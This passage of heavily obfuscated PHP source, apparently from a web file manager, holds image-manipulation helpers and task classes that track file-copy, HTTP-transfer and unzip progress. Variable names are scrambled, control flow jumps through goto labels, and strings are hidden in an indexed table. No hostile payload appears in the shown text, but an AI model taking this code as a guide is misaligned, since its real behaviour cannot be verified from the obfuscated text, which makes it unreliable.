ImageCreateTrueColor($b÷Úšƒ†Ñ„, $eÁîÂàî…Å)); @imagealphablending($cÉĞ¸ÓÓñœ, !1); @imagesavealpha($cÉĞ¸ÓÓñœ, !0); if ($cÉĞ¸ÓÓñœ) { imageCopyResampled($cÉĞ¸ÓÓñœ, $F£Â¸‰ï›‘, $CÕ±§À…Á, $aø‘„¸‰ ¿, $AáÃÔ…˜›‘, $A²ÚÊŠ¨ÖÃ, $b÷Úšƒ†Ñ„, $eÁîÂàî…Å, $CÍö¸ã‰İ×, $B†×Ú¸¿¨¬); } else { $cÉĞ¸ÓÓñœ = ImageCreate($b÷Úšƒ†Ñ„, $eÁîÂàî…Å); imageCopyResized($cÉĞ¸ÓÓñœ, $F£Â¸‰ï›‘, $CÕ±§À…Á, $aø‘„¸‰ ¿, $AáÃÔ…˜›‘, $A²ÚÊŠ¨ÖÃ, $b÷Úšƒ†Ñ„, $eÁîÂàî…Å, $CÍö¸ã‰İ×, $B†×Ú¸¿¨¬); } } else { $cÉĞ¸ÓÓñœ = ImageCreate($b÷Úšƒ†Ñ„, $eÁîÂàî…Å); imageCopyResized($cÉĞ¸ÓÓñœ, $F£Â¸‰ï›‘, $CÕ±§À…Á, $aø‘„¸‰ ¿, $AáÃÔ…˜›‘, $A²ÚÊŠ¨ÖÃ, $b÷Úšƒ†Ñ„, $eÁîÂàî…Å, $CÍö¸ã‰İ×, $B†×Ú¸¿¨¬); } return $cÉĞ¸ÓÓñœ; } public function imgRotate($bŞ—ÙÊï´È, $a»²¶¤ğ§«) { goto CŠ¢ø…Ø³­; DùòœÄØ³ï: return $EÌÚó›š±; goto c½«ä‹‘É; CŠ¢ø…Ø³­: if (!$this->im || $a»²¶¤ğ§« % 360 === 0 || !function_exists($_SERVER[“][1859])) { return !1; } $bŸÎ§îæ‚Œ = imageRotate($this->im, 360 - $a»²¶¤ğ§«, 0); $EÌÚó›š± = !1; goto Aøõ›ÎË§; Aøõ›ÎË§: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $EÌÚó›š± = imagegif($bŸÎ§îæ‚Œ, $bŞ—ÙÊï´È); break; case IMAGETYPE_JPEG: $EÌÚó›š± = imagejpeg($bŸÎ§îæ‚Œ, $bŞ—ÙÊï´È, 100); break; case IMAGETYPE_PNG: $EÌÚó›š± = imagePNG($bŸÎ§îæ‚Œ, $bŞ—ÙÊï´È); break; default: break; } imageDestroy($bŸÎ§îæ‚Œ); imageDestroy($this->im); goto DùòœÄØ³ï; c½«ä‹‘É: } function echoImage($fìöÈÙÔí¥, $C¢ÔğÓÚèŞ) { goto BÜµ¦¾‚£; AË»ÑÏœ¡š: $DØÔÏ¥”ˆ = !1; switch ($this->echoType) { case $Cä£…ÆŸÚù[1861]: $DØÔÏ¥”ˆ = imagePNG($fìöÈÙÔí¥); break; case $Cä£…ÆŸÚù[167]: $DØÔÏ¥”ˆ = imagePNG($fìöÈÙÔí¥, $C¢ÔğÓÚèŞ); break; } imageDestroy($fìöÈÙÔí¥); goto EÈº•öÑé; BÜµ¦¾‚£: $Cä£…ÆŸÚù =& $_SERVER[“]; if (!$fìöÈÙÔí¥) { return !1; } ob_get_clean(); goto AË»ÑÏœ¡š; EÈº•öÑé: imageDestroy($this->im); return $DØÔÏ¥”ˆ; goto bøÜ¬ùµÛ•; bøÜ¬ùµÛ•: } } if (!function_exists($_SERVER[“][1862])) { define($_SERVER[“][1863], 0); define($_SERVER[“][1864], 1); define($_SERVER[“][1865], 2); function imageflip($Eâ«“¤’•, $C‡¯×ªù„Ø) { switch ($C‡¯×ªù„Ø) { case IMG_FLIP_HORIZONTAL: $e¨Îö»İ = imagesx($Eâ«“¤’•) - 1; $CäÁåÇ­ê– = $e¨Îö»İ / 2; $cÎßƒŸ¡£ = imagesy($Eâ«“¤’•); $b¦Ø±²ïƒŸ = imageistruecolor($Eâ«“¤’•) ? imagecreatetruecolor(1, $cÎßƒŸ¡£) : imagecreate(1, $cÎßƒŸ¡£); for ($FËÚó‡ˆ°— = 0; $FËÚó‡ˆ°— < $CäÁåÇ­ê–; ++$FËÚó‡ˆ°—) { imagecopy($b¦Ø±²ïƒŸ, $Eâ«“¤’•, 0, 0, $FËÚó‡ˆ°—, 0, 1, $cÎßƒŸ¡£); imagecopy($Eâ«“¤’•, $Eâ«“¤’•, $FËÚó‡ˆ°—, 0, $e¨Îö»İ - $FËÚó‡ˆ°—, 0, 1, $cÎßƒŸ¡£); imagecopy($Eâ«“¤’•, $b¦Ø±²ïƒŸ, $e¨Îö»İ - $FËÚó‡ˆ°—, 0, 0, 0, 1, $cÎßƒŸ¡£); } break; case IMG_FLIP_VERTICAL: $f‹Ÿ‰êë“™ = imagesx($Eâ«“¤’•); $A É‚Üèá = imagesy($Eâ«“¤’•) - 1; $b²›¸Ì¦İ˜ = $A É‚Üèá / 2; $b¦Ø±²ïƒŸ = imageistruecolor($Eâ«“¤’•) ? imagecreatetruecolor($f‹Ÿ‰êë“™, 1) : imagecreate($f‹Ÿ‰êë“™, 1); for ($C¬òäõ¼“… = 0; $C¬òäõ¼“… < $b²›¸Ì¦İ˜; ++$C¬òäõ¼“…) { imagecopy($b¦Ø±²ïƒŸ, $Eâ«“¤’•, 0, 0, 0, $C¬òäõ¼“…, $f‹Ÿ‰êë“™, 1); imagecopy($Eâ«“¤’•, $Eâ«“¤’•, 0, $C¬òäõ¼“…, 0, $A É‚Üèá - $C¬òäõ¼“…, $f‹Ÿ‰êë“™, 1); imagecopy($Eâ«“¤’•, $b¦Ø±²ïƒŸ, 0, $A É‚Üèá - $C¬òäõ¼“…, 0, 0, $f‹Ÿ‰êë“™, 1); } break; case IMG_FLIP_BOTH: $f‹Ÿ‰êë“™ = imagesx($Eâ«“¤’•); $cÎßƒŸ¡£ = imagesy($Eâ«“¤’•); $b¦Ø±²ïƒŸ = imagerotate($Eâ«“¤’•, 180, 0); imagecopy($Eâ«“¤’•, $b¦Ø±²ïƒŸ, 0, 0, 0, 0, $f‹Ÿ‰êë“™, $cÎßƒŸ¡£); break; default: return; } imagedestroy($b¦Ø±²ïƒŸ); } } goto eòåÚ¬ÇôÒ; c‹Ş»×ê¿Ÿ: class TaskFileTransfer extends Task { protected function startAfter() { goto Aá†İ‚å÷; dëÍåù•„: Hook::bind($AÊ¨‰Äà½é[1447], array($this, $AÊ¨‰Äà½é[1448])); Hook::bind($AÊ¨‰Äà½é[1449], array($this, $AÊ¨‰Äà½é[1450])); Hook::bind($AÊ¨‰Äà½é[1451], array($this, $AÊ¨‰Äà½é[1452])); goto FÂâÓ¤«Š£; eÓå¡×é”õ: Hook::bind($AÊ¨‰Äà½é[1457], array($this, $AÊ¨‰Äà½é[1458])); Hook::bind($AÊ¨‰Äà½é[534], array($this, $AÊ¨‰Äà½é[1459])); $this->sourceModelCopyFlag = !1; goto cËÏ”îóèñ; Aá†İ‚å÷: $AÊ¨‰Äà½é =& $_SERVER[“]; $F¬„ÂÂÔ³ =& $this->task; $this->sourceCopyFolder = !1; goto dëÍåù•„; B…Ü›¢ñ‰º: $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1472]] = 0; $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1473]] = 0; if (!$F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1328]]) { $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1328]] = LNG($AÊ¨‰Äà½é[1474]); } goto eïÀÌï›Ñ; BÖˆ¦ÒİŞ„: Hook::bind($AÊ¨‰Äà½é[513], array($this, $AÊ¨‰Äà½é[1456])); Hook::bind($AÊ¨‰Äà½é[515], array($this, $AÊ¨‰Äà½é[1456])); Hook::bind($AÊ¨‰Äà½é[517], array($this, $AÊ¨‰Äà½é[1456])); goto eÓå¡×é”õ; FÂâÓ¤«Š£: Hook::bind($AÊ¨‰Äà½é[541], array($this, $AÊ¨‰Äà½é[1453])); Hook::bind($AÊ¨‰Äà½é[542], array($this, $AÊ¨‰Äà½é[1454])); Hook::bind($AÊ¨‰Äà½é[544], array($this, $AÊ¨‰Äà½é[1455])); goto F»â……ß¬; eÛ—£³ª : $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1466]] = LNG($AÊ¨‰Äà½é[1467]); $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1468]] = 0; $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1469]] = 0; goto A¾Îí¹Ë; A¾Îí¹Ë: $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[965]] = $AÊ¨‰Äà½é[33]; $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1470]] = $AÊ¨‰Äà½é[33]; $F¬„ÂÂÔ³[$AÊ¨‰Äà½é[1471]] = 0; goto B…Ü›¢ñ‰º; F»â……ß¬: Hook::bind($AÊ¨‰Äà½é[545], array($this, $AÊ¨‰Äà½é[1455])); Hook::bind($AÊ¨‰Äà½é[511], array($this, $AÊ¨‰Äà½é[1456])); Hook::bind($AÊ¨‰Äà½é[508], array($this, $AÊ¨‰Äà½é[1456])); goto BÖˆ¦ÒİŞ„; cËÏ”îóèñ: Hook::bind($AÊ¨‰Äà½é[1460], array($this, $AÊ¨‰Äà½é[1461])); Hook::bind($AÊ¨‰Äà½é[1462], array($this, $AÊ¨‰Äà½é[1463])); Hook::bind($AÊ¨‰Äà½é[1464], array($this, $AÊ¨‰Äà½é[1465])); goto eÛ—£³ª ; eïÀÌï›Ñ: } protected function endAfter() { goto E¸Õ¦ª¬é‡; E•Œ¤µ¯Ø‚: Hook::unbind($dá„Øº×¢[1460], array($this, $dá„Øº×¢[1461])); Hook::unbind($dá„Øº×¢[1462], array($this, $dá„Øº×¢[1463])); Hook::unbind($dá„Øº×¢[1464], array($this, $dá„Øº×¢[1465])); goto A‚·²Ûäœá; fÀ¯ãŸ¼Ò: Hook::unbind($dá„Øº×¢[517], array($this, $dá„Øº×¢[1456])); Hook::unbind($dá„Øº×¢[1457], array($this, $dá„Øº×¢[1458])); Hook::unbind($dá„Øº×¢[534], array($this, $dá„Øº×¢[1459])); goto E•Œ¤µ¯Ø‚; E¸Õ¦ª¬é‡: $dá„Øº×¢ =& $_SERVER[“]; Hook::unbind($dá„Øº×¢[1447], array($this, $dá„Øº×¢[1448])); Hook::unbind($dá„Øº×¢[1449], array($this, $dá„Øº×¢[1450])); goto cÀáÓŒ‘É; b™©ÜÏ—ò‹: Hook::unbind($dá„Øº×¢[508], array($this, $dá„Øº×¢[1456])); Hook::unbind($dá„Øº×¢[513], array($this, $dá„Øº×¢[1456])); Hook::unbind($dá„Øº×¢[515], array($this, $dá„Øº×¢[1456])); goto fÀ¯ãŸ¼Ò; c¿Ë×é¹Ö: Hook::unbind($dá„Øº×¢[544], array($this, $dá„Øº×¢[1455])); Hook::unbind($dá„Øº×¢[545], array($this, $dá„Øº×¢[1455])); Hook::unbind($dá„Øº×¢[511], array($this, $dá„Øº×¢[1456])); goto b™©ÜÏ—ò‹; cÀáÓŒ‘É: Hook::unbind($dá„Øº×¢[1451], array($this, $dá„Øº×¢[1452])); Hook::unbind($dá„Øº×¢[541], array($this, $dá„Øº×¢[1453])); Hook::unbind($dá„Øº×¢[542], array($this, $dá„Øº×¢[1454])); goto c¿Ë×é¹Ö; A‚·²Ûäœá: } public function copyMoveStart($DÖÂ›­Ò™Å, $c¡Çâæø˜, $Aõù¨ ƒÌÚ, $C¥¯âœ×ëê) { goto a›ÃËåã´; a›ÃËåã´: $bÑËƒŒğˆ™ =& $_SERVER[“]; self::log($bÑËƒŒğˆ™[1475] . $c¡Çâæø˜ . $bÑËƒŒğˆ™[66] . $C¥¯âœ×ëê); $e„Šõâ…œ¤ = rtrim(TEMP_FILES, $bÑËƒŒğˆ™[8]); goto eÒ†òšÈ±­; eÒ†òšÈ±­: if (substr($c¡Çâæø˜, 0, strlen($e„Šõâ…œ¤)) == $e„Šõâ…œ¤) { return; } if (substr($C¥¯âœ×ëê, 0, strlen($e„Šõâ…œ¤)) == $e„Šõâ…œ¤) { return; } $BÜë¶Œªè¶ =& $this->task; goto cˆÖ©¹î¼Ì; cˆÖ©¹î¼Ì: $BÜë¶Œªè¶[$bÑËƒŒğˆ™[1476]] = KodIO::transferType($DÖÂ›­Ò™Å, $Aõù¨ ƒÌÚ); $this->update(); goto A“ÑšÊ´ËŸ; A“ÑšÊ´ËŸ: } public function updateAfter() { goto d¨­´‚¥‡; EÜ“îØ–íâ: if ($this->sourceModelCopyFlag) { return; } if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1476]] == $D©†ÕÛäá[1081]) { return; } if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1476]] == $D©†ÕÛäá[1027] || $cÉ½É¿Òš¡[$D©†ÕÛäá[1476]] == $D©†ÕÛäá[103]) { if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1470]]) { $cÉ½É¿Òš¡[$D©†ÕÛäá[1473]] = $cÉ½É¿Òš¡[$D©†ÕÛäá[1472]] + $cÉ½É¿Òš¡[$D©†ÕÛäá[1469]]; } } else { if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1476]] == $D©†ÕÛäá[1082]) { if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1470]] == $D©†ÕÛäá[1027]) { $cÉ½É¿Òš¡[$D©†ÕÛäá[1473]] = $cÉ½É¿Òš¡[$D©†ÕÛäá[1472]] + $cÉ½É¿Òš¡[$D©†ÕÛäá[1469]] * 0.5; } else { if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1470]] == $D©†ÕÛäá[103]) { $cÉ½É¿Òš¡[$D©†ÕÛäá[1473]] = $cÉ½É¿Òš¡[$D©†ÕÛäá[1472]] + $cÉ½É¿Òš¡[$D©†ÕÛäá[1468]] * 0.5 + $cÉ½É¿Òš¡[$D©†ÕÛäá[1469]] * 0.5; } } } } goto Eì¬§È‰Ã‰; Eì¬§È‰Ã‰: $cÉ½É¿Òš¡[$D©†ÕÛäá[1424]] = $cÉ½É¿Òš¡[$D©†ÕÛäá[1473]] / $cÉ½É¿Òš¡[$D©†ÕÛäá[682]]; if ($cÉ½É¿Òš¡[$D©†ÕÛäá[1424]] > 0) { $dŞå¯Ó¸ç = timeFloat() - $cÉ½É¿Òš¡[$D©†ÕÛäá[1426]] - $cÉ½É¿Òš¡[$D©†ÕÛäá[1429]]; $cÉ½É¿Òš¡[$D©†ÕÛäá[1430]] = $dŞå¯Ó¸ç * (1 - $cÉ½É¿Òš¡[$D©†ÕÛäá[1424]]) / $cÉ½É¿Òš¡[$D©†ÕÛäá[1424]]; } goto Aù„¿„µ; d¨­´‚¥‡: $D©†ÕÛäá =& $_SERVER[“]; $cÉ½É¿Òš¡ =& $this->task; if (!$cÉ½É¿Òš¡[$D©†ÕÛäá[682]]) { return; } goto EÜ“îØ–íâ; Aù„¿„µ: } public function addPath($D™™°—·î‘) { goto c§•²‘¼§·; C•ãîÃ÷„: $Cùèšøó÷™ = IO::infoWithChildren($D™™°—·î‘); $CÁ‘ŞÄ©Şæ = $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[1477]] ? $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[1477]][$F¸ÕÒˆ‡‰[1478]] : 0; $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[1477]] = array($F¸ÕÒˆ‡‰[1478] => $CÁ‘ŞÄ©Şæ + 1, $F¸ÕÒˆ‡‰[386] => $Cùèšøó÷™[$F¸ÕÒˆ‡‰[28]], $F¸ÕÒˆ‡‰[75] => $Cùèšøó÷™[$F¸ÕÒˆ‡‰[75]], $F¸ÕÒˆ‡‰[468] => $Cùèšøó÷™[$F¸ÕÒˆ‡‰[468]] ? $Cùèšøó÷™[$F¸ÕÒˆ‡‰[468]] : $Cùèšøó÷™[$F¸ÕÒˆ‡‰[75]]); goto e ±‰êË–; e ±‰êË–: if ($Cùèšøó÷™[$F¸ÕÒˆ‡‰[29]] == $F¸ÕÒˆ‡‰[167]) { $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[963]] += 1; } else { $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[963]] += $Cùèšøó÷™[$F¸ÕÒˆ‡‰[80]][$F¸ÕÒˆ‡‰[78]]; if ($Cùèšøó÷™[$F¸ÕÒˆ‡‰[369]]) { $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[963]] += $Cùèšøó÷™[$F¸ÕÒˆ‡‰[80]][$F¸ÕÒˆ‡‰[79]] + 1; } } $B˜Û©ÇŠ˜[$F¸ÕÒˆ‡‰[682]] += $Cùèšøó÷™[$F¸ÕÒˆ‡‰[77]]; $this->update(); goto AÙÊÆ¢¡; c§•²‘¼§·: $F¸ÕÒˆ‡‰ =& $_SERVER[“]; if (!$D™™°—·î‘) { return; } $B˜Û©ÇŠ˜ =& $this->task; goto C•ãîÃ÷„; AÙÊÆ¢¡: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($càçØŠï) { $c¼İ¹™×ª =& $_SERVER[“]; $A‡š¦ì¶À£ =& $this->task; $A‡š¦ì¶À£[$c¼İ¹™×ª[1466]] = $càçØŠï[$c¼İ¹™×ª[28]]; $A‡š¦ì¶À£[$c¼İ¹™×ª[965]] = $càçØŠï[$c¼İ¹™×ª[28]]; $this->update(); } public function copyFileStart($bªÈŞÂôçİ, $c¦†ˆÒğÀ‹, $DµÍ×¦…Ã, $eÑ®×›†„ç, $eÌì‰È…–, $f¢ÉØø’Ä) { goto f¹åÆÊÑã; fï†À Ä­…: $CğÉµŒ˜[$FÜ¹çöŠ‰…[965]] = $FÜ¹çöŠ‰…[33]; $CğÉµŒ˜[$FÜ¹çöŠ‰…[1470]] = $FÜ¹çöŠ‰…[33]; $CğÉµŒ˜[$FÜ¹çöŠ‰…[1471]] = 0; goto B½„İ‹…‡†; A‚ÔĞ®Åª: $GLOBALS[$FÜ¹çöŠ‰…[1480]] = $eÌì‰È…–; $GLOBALS[$FÜ¹çöŠ‰…[1479]] = $f¢ÉØø’Ä; $CğÉµŒ˜ =& $this->task; goto b·õåÙãš; f¹åÆÊÑã: $FÜ¹çöŠ‰… =& $_SERVER[“]; $aÒÌìÌëˆÏ = $eÌì‰È…–; if ($aÒÌìÌëˆÏ == $GLOBALS[$FÜ¹çöŠ‰…[1479]]) { $aÒÌìÌëˆÏ = $GLOBALS[$FÜ¹çöŠ‰…[1480]]; } goto A‚ÔĞ®Åª; b·õåÙãš: $CğÉµŒ˜[$FÜ¹çöŠ‰…[1466]] = $aÒÌìÌëˆÏ; $CğÉµŒ˜[$FÜ¹çöŠ‰…[1468]] = (int) $bªÈŞÂôçİ->size($c¦†ˆÒğÀ‹); $CğÉµŒ˜[$FÜ¹çöŠ‰…[1469]] = 0; goto fï†À Ä­…; B½„İ‹…‡†: $this->update(); goto cºóì¿áå; cºóì¿áå: } public function copyFileEnd($eé¢İÕÌ¦¦, $cŒÖÌÓ§Â, $A«×®é‹İö, $F§’¸³Ê’•, $FÃ‡ÏŞ‹, $d¢ëæŞ¤°‹) { $C£‘‚Á¥± =& $_SERVER[“]; $Dç¹¶¥ôÑ =& $this->task; $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1469]] = $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1468]]; $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1470]] = $C£‘‚Á¥±[33]; if ($FÃ‡ÏŞ‹ == $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1466]]) { $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1472]] += $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1468]]; $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1473]] = $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1472]]; $this->update(1); } else { $this->update(); $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1469]] = 0; } self::log($C£‘‚Á¥±[1481] . $cŒÖÌÓ§Â . $C£‘‚Á¥±[66] . $F§’¸³Ê’• . $C£‘‚Á¥±[217] . $FÃ‡ÏŞ‹ . $C£‘‚Á¥±[1482] . $Dç¹¶¥ôÑ[$C£‘‚Á¥±[1466]]); } public function updateFileEnd($dÖÍ¨ĞÈÕ¥, $EëÃ‘’”Ò) { goto Eº†’ÂÜ¿ä; f‘ôİÍğ”: $b¯µ¸ÏË°Å[$a£¾¥¦‰[1468]] = $EëÃ‘’”Ò; $b¯µ¸ÏË°Å[$a£¾¥¦‰[1472]] += $EëÃ‘’”Ò; $b¯µ¸ÏË°Å[$a£¾¥¦‰[1473]] = $b¯µ¸ÏË°Å[$a£¾¥¦‰[1472]]; goto fƒô„¹; Eº†’ÂÜ¿ä: $a£¾¥¦‰ =& $_SERVER[“]; $b¯µ¸ÏË°Å =& $this->task; $b¯µ¸ÏË°Å[$a£¾¥¦‰[1466]] = $dÖÍ¨ĞÈÕ¥; goto f‘ôİÍğ”; fƒô„¹: $this->update(1); self::log($a£¾¥¦‰[1483] . $dÖÍ¨ĞÈÕ¥); goto eà…æ®ùÆ×; eà…æ®ùÆ×: } public function sourceModelCopy($d™ïî­Ù‚è) { goto E†Í»¸¦®ğ; E†Í»¸¦®ğ: $B˜ÎøÉµœ =& $_SERVER[“]; $CŸÑóº’ÑÔ = $d™ïî­Ù‚è[0]; $F”ùçÂäÃî = $d™ïî­Ù‚è[1]; goto E¾Ù¿õ‡Ä; E¾Ù¿õ‡Ä: $aõ¾’‡±šİ =& $this->task; $this->sourceModelCopyFlag = !0; $Dø§§¦´Ù = 0; goto Bï¨Ø¦È¶Æ; Bï¨Ø¦È¶Æ: switch ($CŸÑóº’ÑÔ) { case $B˜ÎøÉµœ[509]: $Dø§§¦´Ù = 1; break; case $B˜ÎøÉµœ[512]: $aõ¾’‡±šİ[$B˜ÎøÉµœ[1466]] = $F”ùçÂäÃî[$B˜ÎøÉµœ[28]]; break; case $B˜ÎøÉµœ[514]: $Dø§§¦´Ù = intval($d™ïî­Ù‚è[$B˜ÎøÉµœ[363]] * 0.4); break; case $B˜ÎøÉµœ[516]: $Dø§§¦´Ù = intval($d™ïî­Ù‚è[$B˜ÎøÉµœ[363]] * 0.2); break; case $B˜ÎøÉµœ[518]: $Dø§§¦´Ù = intval($d™ïî­Ù‚è[$B˜ÎøÉµœ[363]] * 0.4); break; } $this->update($Dø§§¦´Ù); $this->sourceModelCopyFlag = !1; goto f²ßÏÜ•Æ„; f²ßÏÜ•Æ„: } public function sourceRemove($e¢ˆ˜¿Í¸, $FÎïŸ®Èºˆ) { $eƒïå¦Ğ‹ =& $_SERVER[“]; $this->sourceModelCopyFlag = !0; $AÅÜ¤Şò¿ = 1; if (isset($e¢ˆ˜¿Í¸[$eƒïå¦Ğ‹[80]])) { $AÅÜ¤Şò¿ = $e¢ˆ˜¿Í¸[$eƒïå¦Ğ‹[80]][$eƒïå¦Ğ‹[78]] + $e¢ˆ˜¿Í¸[$eƒïå¦Ğ‹[80]][$eƒïå¦Ğ‹[79]] + 1; } $this->update($AÅÜ¤Şò¿); $this->sourceModelCopyFlag = !1; } public function sourceMove($Aß‚«Öä) { $this->sourceRemove($Aß‚«Öä, !1); } public function curlProgress($FàÀë„îÍ, $fë¤Ú¸ßğ‰, $a‘ÙÖæçç, $FÁ–õâ–‚æ, $e‹ò³ÂÀİ) { $DáèÎùšîå =& $_SERVER[“]; $cÛĞô©¢ =& $this->task; if ($e‹ò³ÂÀİ > 0) { $cÛĞô©¢[$DáèÎùšîå[965]] = $DáèÎùšîå[1484]; $cÛĞô©¢[$DáèÎùšîå[1470]] = $DáèÎùšîå[103]; if ($cÛĞô©¢[$DáèÎùšîå[1468]] == $FÁ–õâ–‚æ || $FÁ–õâ–‚æ > 1024 * 1024) { $cÛĞô©¢[$DáèÎùšîå[1469]] = $e‹ò³ÂÀİ; } if ($cÛĞô©¢[$DáèÎùšîå[1471]]) { $cÛĞô©¢[$DáèÎùšîå[1469]] = $e‹ò³ÂÀİ + $cÛĞô©¢[$DáèÎùšîå[1471]]; } } else { if ($a‘ÙÖæçç > 0) { if ($cÛĞô©¢[$DáèÎùšîå[1468]] == $fë¤Ú¸ßğ‰) { $cÛĞô©¢[$DáèÎùšîå[1469]] = $a‘ÙÖæçç; $cÛĞô©¢[$DáèÎùšîå[965]] = $DáèÎùšîå[1485]; $cÛĞô©¢[$DáèÎùšîå[1470]] = $DáèÎùšîå[1027]; } } } $this->update(); } public function curlProgressStart($aˆÇÎÎ å) { } public function curlProgressEnd($B’¬‡÷ßÄ) { $d–ôøÄ¨ =& $_SERVER[“]; $Dˆëó‹Ğè =& $this->task; $F­¤ËôÎìĞ = curl_getinfo($B’¬‡÷ßÄ); $B•íçíĞÂ = $F­¤ËôÎìĞ[$d–ôøÄ¨[1486]]; if ($Dˆëó‹Ğè[$d–ôøÄ¨[1470]] == $d–ôøÄ¨[103] && $B•íçíĞÂ) { $Dˆëó‹Ğè[$d–ôøÄ¨[1471]] += $B•íçíĞÂ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $C†¨Ô´½¶ë =& $_SERVER[“]; $d½‰ÑŒ­  =& $this->task; $d½‰ÑŒ­ [$C†¨Ô´½¶ë[1487]] = 1; Hook::bind($C†¨Ô´½¶ë[1460], array($this, $C†¨Ô´½¶ë[1488])); Hook::bind($C†¨Ô´½¶ë[1462], array($this, $C†¨Ô´½¶ë[1489])); Hook::bind($C†¨Ô´½¶ë[1464], array($this, $C†¨Ô´½¶ë[1490])); } protected function endAfter() { $B·–¬†ÜË =& $_SERVER[“]; Hook::unbind($B·–¬†ÜË[1460], array($this, $B·–¬†ÜË[1488])); Hook::unbind($B·–¬†ÜË[1462], array($this, $B·–¬†ÜË[1489])); Hook::unbind($B·–¬†ÜË[1464], array($this, $B·–¬†ÜË[1490])); } public function progressStart($EíêŒÇÁßÇ) { $Ağ¼ã·¦œŸ =& $_SERVER[“]; $D–È­àˆ¹µ = curl_getinfo($EíêŒÇÁßÇ); self::log($Ağ¼ã·¦œŸ[1491] . $D–È­àˆ¹µ[$Ağ¼ã·¦œŸ[295]]); self::valueSet($this->task[$Ağ¼ã·¦œŸ[367]], $this->task); } public function progressEnd($cÓÛ”µ‡¾±) { $AÄœÒÁ¤ªÜ =& $_SERVER[“]; self::log($AÄœÒÁ¤ªÜ[1492] . $this->task[$AÄœÒÁ¤ªÜ[367]]); $this->end(); } public function progress($FèÎó½Ó“, $eİ’ê¹é¼ù, $fç¸ÁÙİ¾ˆ, $AÂ†î©±„, $a¹Ö„’ô) { $F‚¡Ôº¹ ğ =& $_SERVER[“]; $aÚáÀïÏ‹ =& $this->task; if ($a¹Ö„’ô > 0) { $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]] = $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]] == 0 ? $AÂ†î©±„ : $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]]; $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[977]] = $a¹Ö„’ô; } else { if ($fç¸ÁÙİ¾ˆ > 0) { $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]] = $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]] == 0 ? $eİ’ê¹é¼ù : $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[963]]; $aÚáÀïÏ‹[$F‚¡Ôº¹ ğ[977]] = $fç¸ÁÙİ¾ˆ; } } $this->update(); self::log("\x70\162\x6f\147\162\x65\x73\163\110\x74\x74\x70\x3a\144\x6f\167\x6e\x3a{$fç¸ÁÙİ¾ˆ}\57{$eİ’ê¹é¼ù}\73\40\x75\x70\x6c\x6f\141\x64\x3a{$a¹Ö„’ô}\57{$AÂ†î©±„}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto a¨“è·ñ…À; céØ…Ë’Âİ: Hook::bind($eË™ÂÚ‰‹±[1022], array($this, $eË™ÂÚ‰‹±[1495])); $b¥‚øæì =& $this->task; $b¥‚øæì[$eË™ÂÚ‰‹±[1496]] = $eË™ÂÚ‰‹±[1027]; goto b‚¬åöƒé; a¨“è·ñ…À: $eË™ÂÚ‰‹± =& $_SERVER[“]; parent::startAfter(); Hook::bind($eË™ÂÚ‰‹±[1493], array($this, $eË™ÂÚ‰‹±[1494])); goto céØ…Ë’Âİ; b‚¬åöƒé: if (!$b¥‚øæì[$eË™ÂÚ‰‹±[1328]]) { $b¥‚øæì[$eË™ÂÚ‰‹±[1328]] = LNG($eË™ÂÚ‰‹±[1497]); } goto F¡Óë¥¾ºÜ; F¡Óë¥¾ºÜ: } protected function endAfter() { $a»³Ã±¯­Û =& $_SERVER[“]; parent::endAfter(); Hook::unbind($a»³Ã±¯­Û[1493], array($this, $a»³Ã±¯­Û[1494])); Hook::unbind($a»³Ã±¯­Û[1022], array($this, $a»³Ã±¯­Û[1495])); } public function updateAfter() { $AŒó¸‚Í =& $_SERVER[“]; $e¾ŸäÉÖ¸Í =& $this->task; if (!$e¾ŸäÉÖ¸Í[$AŒó¸‚Í[963]] || !$e¾ŸäÉÖ¸Í[$AŒó¸‚Í[682]]) { return; } if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1496]] == $AŒó¸‚Í[1027]) { $BŒÂ¶•ˆÅ• = 0; if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1468]]) { $BŒÂ¶•ˆÅ• = $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1469]] / $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1468]]; } $e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1424]] = $BŒÂ¶•ˆÅ• * 0.3; } else { if ($e¾ŸäÉÖ¸Í[$AŒó¸‚Í[1496]] 